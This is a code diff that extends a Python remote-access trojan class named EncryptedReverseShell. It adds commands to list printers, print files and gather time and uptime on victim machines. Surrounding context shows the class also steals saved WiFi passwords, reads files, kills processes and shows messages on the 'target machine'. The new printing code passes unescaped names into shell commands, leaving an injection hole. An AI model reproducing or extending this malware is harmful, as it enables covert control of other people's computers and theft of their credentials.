@@ -17,7 +17,7 @@ import tempfile
 import time
 import sys
 import locale
-from datetime import datetime
+from datetime import datetime, timedelta
 import psutil
 from PIL import ImageGrab
 import cv2
@@ -199,7 +199,7 @@ class EncryptedReverseShell:
 
     def get_public_ip(self):
         try:
-            return requests.get('https://api.ipify.org').text
+            return requests.get('https://api.ipify.org', timeout=10).text
         except:
             return "Error of getting public ip!"
         
@@ -208,6 +208,334 @@ class EncryptedReverseShell:
             return socket.gethostbyname(socket.gethostname())
         except:
             return "Error of getting private ip!"
+
+    def list_printers(self):
+        """Get list of available printers"""
+        try:
+            if platform.system() != "Windows":
+                return {"error": "Printer listing is only supported on Windows"}
+            
+            printers = []
+            
+            # Method 1: Using wmic
+            try:
+                result = subprocess.run(
+                    ['wmic', 'printer', 'get', 'Name,DeviceID,DriverName,PortName,Shared,Location,Status'],
+                    capture_output=True,
+                    timeout=10
+                )
+                
+                if result.returncode == 0:
+                    system_encoding = self.get_system_encoding()
+                    try:
+                        output = result.stdout.decode(system_encoding, errors='replace')
+                    except:
+                        output = result.stdout.decode('utf-8', errors='replace')
+                    
+                    lines = output.strip().split('\n')
+                    if len(lines) > 1:
+                        for line in lines[1:]:
+                            line = line.strip()
+                            if line:
+                                parts = [p.strip() for p in line.split('  ') if p.strip()]
+                                if len(parts) >= 4:
+                                    printers.append({
+                                        "name": parts[0],
+                                        "device_id": parts[1] if len(parts) > 1 else "Unknown",
+                                        "driver": parts[2] if len(parts) > 2 else "Unknown",
+                                        "port": parts[3] if len(parts) > 3 else "Unknown",
+                                        "shared": parts[4] if len(parts) > 4 else "Unknown",
+                                        "location": parts[5] if len(parts) > 5 else "N/A",
+                                        "status": parts[6] if len(parts) > 6 else "Unknown"
+                                    })
+            except Exception as e:
+                pass
+            
+            # Method 2: If wmic failed, try using PowerShell
+            if not printers:
+                try:
+                    ps_command = 'Get-Printer | Select-Object Name,DriverName,PortName,Shared,Location,PrinterStatus | ConvertTo-Json'
+                    result = subprocess.run(
+                        ['powershell', '-Command', ps_command],
+                        capture_output=True,
+                        timeout=15
+                    )
+                    
+                    if result.returncode == 0:
+                        printers_data = json.loads(result.stdout.decode('utf-8', errors='replace'))
+                        
+                        if isinstance(printers_data, dict):
+                            printers_data = [printers_data]
+                        
+                        for printer in printers_data:
+                            status_map = {
+                                0: "Ready",
+                                1: "Paused",
+                                2: "Error",
+                                3: "Pending Deletion",
+                                4: "Paper Jam",
+                                5: "Paper Out",
+                                6: "Manual Feed",
+                                7: "Paper Problem",
+                                8: "Offline",
+                                9: "IO Active",
+                                10: "Busy",
+                                11: "Printing",
+                                12: "Output Bin Full",
+                                13: "Not Available",
+                                14: "Waiting",
+                                15: "Processing",
+                                16: "Initializing",
+                                17: "Warming Up",
+                                18: "Toner Low",
+                                19: "No Toner",
+                                20: "Page Punt",
+                                21: "User Intervention",
+                                22: "Out of Memory",
+                                23: "Door Open",
+                                24: "Server Unknown",
+                                25: "Power Save"
+                            }
+                            
+                            status_code = printer.get('PrinterStatus', 0)
+                            status_text = status_map.get(status_code, f"Unknown ({status_code})")
+                            
+                            printers.append({
+                                "name": printer.get('Name', 'Unknown'),
+                                "device_id": "N/A",
+                                "driver": printer.get('DriverName', 'Unknown'),
+                                "port": printer.get('PortName', 'Unknown'),
+                                "shared": "Yes" if printer.get('Shared', False) else "No",
+                                "location": printer.get('Location', 'N/A'),
+                                "status": status_text
+                            })
+                except:
+                    pass
+            
+            if not printers:
+                return {"error": "No printers found"}
+            
+            return {
+                "printers": printers,
+                "total_printers": len(printers)
+            }
+            
+        except Exception as e:
+            return {"error": f"Printer listing failed: {str(e)}"}
+
+    def print_file(self, file_path, printer_name):
+        """Print a file to specified printer"""
+        try:
+            if not os.path.exists(file_path):
+                return {"error": f"File not found: {file_path}"}
+            
+            if not os.path.isfile(file_path):
+                return {"error": f"Path is not a file: {file_path}"}
+            
+            system = platform.system()
+            
+            if system == "Windows":
+                # Method 1: Try using notepad for text files
+                file_ext = os.path.splitext(file_path)[1].lower()
+                
+                if file_ext in ['.txt', '.csv', '.log', '.xml', '.html', '.htm', '.py', '.js', '.css']:
+                    try:
+                        # Use notepad with /p flag for printing
+                        command = f'notepad /p "{file_path}"'
+                        if printer_name:
+                            # Set as default printer first, then print
+                            temp_set_default = f'rundll32 printui.dll,PrintUIEntry /y /n "{printer_name}"'
+                            subprocess.run(temp_set_default, shell=True, capture_output=True, timeout=10)
+                            time.sleep(1)
+                        
+                        result = subprocess.run(command, shell=True, capture_output=True, timeout=15)
+                        
+                        if result.returncode == 0:
+                            return {
+                                "success": True,
+                                "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}'",
+                                "file": file_path,
+                                "printer": printer_name if printer_name else "default"
+                            }
+                    except:
+                        pass
+                
+                # Method 2: Use PowerShell for any file type
+                try:
+                    if printer_name:
+                        ps_command = f'''
+                        $printer = "{printer_name}"
+                        $file = "{file_path}"
+                        Start-Process -FilePath $file -Verb Print -PassThru | Out-Null
+                        '''
+                    else:
+                        ps_command = f'''
+                        $file = "{file_path}"
+                        Start-Process -FilePath $file -Verb Print -PassThru | Out-Null
+                        '''
+                    
+                    result = subprocess.run(
+                        ['powershell', '-Command', ps_command],
+                        capture_output=True,
+                        timeout=15
+                    )
+                    
+                    if result.returncode == 0:
+                        return {
+                            "success": True,
+                            "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via PowerShell",
+                            "file": file_path,
+                            "printer": printer_name if printer_name else "default"
+                        }
+                except Exception as e:
+                    return {"error": f"PowerShell print failed: {str(e)}"}
+                
+                # Method 3: Use the 'print' command
+                try:
+                    if printer_name:
+                        command = f'print /D:"{printer_name}" "{file_path}"'
+                    else:
+                        command = f'print "{file_path}"'
+                    
+                    result = subprocess.run(command, shell=True, capture_output=True, timeout=15)
+                    
+                    if result.returncode == 0:
+                        return {
+                            "success": True,
+                            "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via print command",
+                            "file": file_path,
+                            "printer": printer_name if printer_name else "default"
+                        }
+                except:
+                    pass
+                
+                return {"error": f"Failed to print file. Make sure the file type is supported and printer is available"}
+                
+            elif system == "Linux":
+                # Linux printing using lp command
+                try:
+                    if printer_name:
+                        command = ['lp', '-d', printer_name, file_path]
+                    else:
+                        command = ['lp', file_path]
+                    
+                    result = subprocess.run(command, capture_output=True, timeout=15)
+                    
+                    if result.returncode == 0:
+                        return {
+                            "success": True,
+                            "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via lp",
+                            "file": file_path,
+                            "printer": printer_name if printer_name else "default"
+                        }
+                    else:
+                        error_output = result.stderr.decode('utf-8', errors='replace')
+                        return {"error": f"Print failed: {error_output}"}
+                        
+                except FileNotFoundError:
+                    # Try alternative: lpr
+                    try:
+                        if printer_name:
+                            command = ['lpr', '-P', printer_name, file_path]
+                        else:
+                            command = ['lpr', file_path]
+                        
+                        result = subprocess.run(command, capture_output=True, timeout=15)
+                        
+                        if result.returncode == 0:
+                            return {
+                                "success": True,
+                                "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via lpr",
+                                "file": file_path,
+                                "printer": printer_name if printer_name else "default"
+                            }
+                        else:
+                            return {"error": "Neither 'lp' nor 'lpr' commands are available. Install CUPS or lpr."}
+                    except FileNotFoundError:
+                        return {"error": "Printing utilities not found. Install CUPS with: sudo apt-get install cups"}
+            else:
+                return {"error": f"Unsupported platform for printing: {system}"}
+                
+        except Exception as e:
+            return {"error": f"Print file failed: {str(e)}"}
+
+    def get_local_time(self):
+        """Get local time of client machine"""
+        try:
+            now = datetime.now()
+            
+            # Get timezone info
+            import time
+            timezone_name = time.tzname[0] if hasattr(time, 'tzname') else "Unknown"
+            
+            # Check if DST is in effect
+            is_dst = time.localtime().tm_isdst > 0
+            
+            # Get UTC offset
+            utc_offset = -time.timezone / 3600
+            if is_dst:
+                utc_offset = -time.altzone / 3600
+            
+            # Format various time representations
+            local_time_info = {
+                "datetime": now.strftime("%Y-%m-%d %H:%M:%S"),
+                "date": now.strftime("%Y-%m-%d"),
+                "time": now.strftime("%H:%M:%S"),
+                "time_12h": now.strftime("%I:%M:%S %p"),
+                "day_of_week": now.strftime("%A"),
+                "day_of_year": now.strftime("%j"),
+                "week_number": now.strftime("%W"),
+                "month": now.strftime("%B"),
+                "year": now.strftime("%Y"),
+                "timestamp": now.timestamp(),
+                "timezone": timezone_name,
+                "utc_offset_hours": utc_offset,
+                "is_dst": is_dst,
+                "iso_format": now.isoformat(),
+                "unix_timestamp": int(now.timestamp())
+            }
+            
+            # Add system-specific time info
+            if platform.system() == "Windows":
+                try:
+                    # Get additional Windows time info
+                    result = subprocess.run(
+                        ['wmic', 'os', 'get', 'LastBootUpTime,LocalDateTime'],
+                        capture_output=True,
+                        timeout=5
+                    )
+                    
+                    if result.returncode == 0:
+                        output = result.stdout.decode('utf-8', errors='replace')
+                        for line in output.split('\n'):
+                            if line.strip() and '.' in line:
+                                # Parse LocalDateTime format: 20240101120000.500000+060
+                                parts = line.split('.')
+                                if len(parts) >= 2:
+                                    datetime_str = parts[0]
+                                    if len(datetime_str) >= 14:
+                                        boot_time = datetime.strptime(datetime_str[:14], "%Y%m%d%H%M%S")
+                                        local_time_info["last_boot"] = boot_time.strftime("%Y-%m-%d %H:%M:%S")
+                                        
+                                        # Calculate uptime
+                                        boot_timestamp = boot_time.timestamp()
+                                        uptime_seconds = now.timestamp() - boot_timestamp
+                                        uptime_days = int(uptime_seconds // 86400)
+                                        uptime_hours = int((uptime_seconds % 86400) // 3600)
+                                        uptime_minutes = int((uptime_seconds % 3600) // 60)
+                                        
+                                        local_time_info["uptime"] = f"{uptime_days} days, {uptime_hours} hours, {uptime_minutes} minutes"
+                                        local_time_info["uptime_seconds"] = int(uptime_seconds)
+                                    break
+                except:
+                    pass
+            
+            return {
+                "local_time": local_time_info
+            }
+            
+        except Exception as e:
+            return {"error": f"Failed to get local time: {str(e)}"}
 
     def get_system_info(self):
         info = {
@@ -252,7 +580,6 @@ class EncryptedReverseShell:
         return info
     
     def show_messagebox(self, title="Message", message="", msg_type="info"):
-        """Show a message box on the target machine"""
         try:
             if not message:
                 return {"error": "No message provided"}
@@ -324,7 +651,7 @@ class EncryptedReverseShell:
                 "charging": battery.power_plugged,
                 "status": "Charging" if battery.power_plugged else "Discharging",
                 "seconds_left": battery.secsleft if battery.secsleft != -1 else "Unknown",
-                "time_left": str(datetime.timedelta(seconds=battery.secsleft)) if battery.secsleft > 0 else "Unknown",
+                "time_left": str(timedelta(seconds=battery.secsleft)) if battery.secsleft > 0 else "Unknown",
                 "wmi_details": wmi_info
             }
             
@@ -384,7 +711,6 @@ class EncryptedReverseShell:
             return {"error": f"Shutdown failed: {str(e)}"}
 
     def get_wifi_passwords(self):
-        """Get all saved WiFi passwords"""
         try:
             if platform.system() != "Windows":
                 return {"error": "WiFi password extraction is only supported on Windows"}
@@ -538,7 +864,6 @@ class EncryptedReverseShell:
             return {"error": f"Failed to get current directory: {str(e)}"}
 
     def ls_directory(self, path=None):
-        """List directory contents with detailed info (like ls -la)"""
         try:
             if path is None:
                 path = os.getcwd()
@@ -654,7 +979,6 @@ class EncryptedReverseShell:
             return {"error": f"Failed to list directory: {str(e)}"}
 
     def cat_file(self, file_path):
-        """Read and return file contents"""
         try:
             if not os.path.exists(file_path):
                 return {"error": f"File not found: {file_path}"}
@@ -671,7 +995,6 @@ class EncryptedReverseShell:
             with open(file_path, 'rb') as f:
                 raw_data = f.read()
             
-            # Проверяем, является ли файл текстовым (ищем нулевые байты)
             is_binary = b'\x00' in raw_data[:1000]
             
             if is_binary:
@@ -684,14 +1007,11 @@ class EncryptedReverseShell:
                     "is_binary": True
                 }
             
-            # Пробуем разные кодировки для текстовых файлов
             encodings_to_try = []
             
-            # Добавляем системную кодировку первой
             if system_encoding not in encodings_to_try:
                 encodings_to_try.append(system_encoding)
             
-            # Добавляем другие кодировки
             additional_encodings = [
                 'utf-8',
                 'cp1251',      # Windows Cyrillic
@@ -707,7 +1027,6 @@ class EncryptedReverseShell:
                 if enc not in encodings_to_try:
                     encodings_to_try.append(enc)
             
-            # Пытаемся декодировать с каждой кодировкой
             best_result = None
             best_encoding = None
             
@@ -715,31 +1034,24 @@ class EncryptedReverseShell:
                 try:
                     decoded = raw_data.decode(encoding)
                     
-                    # Проверяем, содержит ли текст кириллические символы
                     has_cyrillic = any(
                         'А' <= char <= 'я' or char in 'Ёё' 
                         for char in decoded
                     )
                     
-                    # Если есть кириллица и это не utf-8, пробуем дальше
                     if has_cyrillic and encoding != 'utf-8':
-                        # Проверяем, не является ли это на самом деле utf-8,
-                        # который случайно декодировался в другой кодировке
                         try:
                             raw_data.decode('utf-8')
-                            # Если utf-8 работает, используем его
                             best_result = raw_data.decode('utf-8')
                             best_encoding = 'utf-8'
                             break
                         except:
                             pass
                     
-                    # Сохраняем результат, если он выглядит нормально
                     if best_result is None or (has_cyrillic and best_encoding != 'utf-8'):
                         best_result = decoded
                         best_encoding = encoding
                         
-                        # Если нашли кириллицу, прекращаем поиск
                         if has_cyrillic:
                             break
                             
@@ -756,7 +1068,6 @@ class EncryptedReverseShell:
                     "is_binary": False
                 }
             
-            # Если ничего не подошло, возвращаем в base64
             return {
                 "file_name": os.path.basename(file_path),
                 "file_path": file_path,
@@ -770,7 +1081,6 @@ class EncryptedReverseShell:
             return {"error": f"Failed to read file: {str(e)}"}
 
     def suspend_process(self, process_identifier):
-        """Suspend a process by name or PID"""
         try:
             target_pid = None
             process_name = None
@@ -821,7 +1131,6 @@ class EncryptedReverseShell:
             return {"error": f"Process suspension failed: {str(e)}"}
         
     def open_page(self, url):
-        """Open a URL in the default web browser"""
         try:
             if not url:
                 return {"error": "No URL provided"}
@@ -839,7 +1148,6 @@ class EncryptedReverseShell:
             return {"error": f"Error opening URL: {str(e)}"}
 
     def kill_process(self, process_identifier):
-        """Kill a process by name or PID"""
         try:
             target_pid = None
             process_name = None
@@ -1504,6 +1812,20 @@ WantedBy=default.target
                     return {"suspend_result": self.suspend_process(command)}
                 else:
                     return {"error": "Please specify process name or PID"}
+                
+            elif cmd_type == "list_printers":
+                return {"printer_list": self.list_printers()}
+
+            elif cmd_type == "print_file":
+                file_path = command_data.get('file_path')
+                printer_name = command_data.get('printer_name', '')
+                if file_path:
+                    return {"print_result": self.print_file(file_path, printer_name)}
+                else:
+                    return {"error": "Missing file_path"}
+
+            elif cmd_type == "local_time":
+                return {"local_time_result": self.get_local_time()}
             
             elif cmd_type == "kill_process":
                 if command:
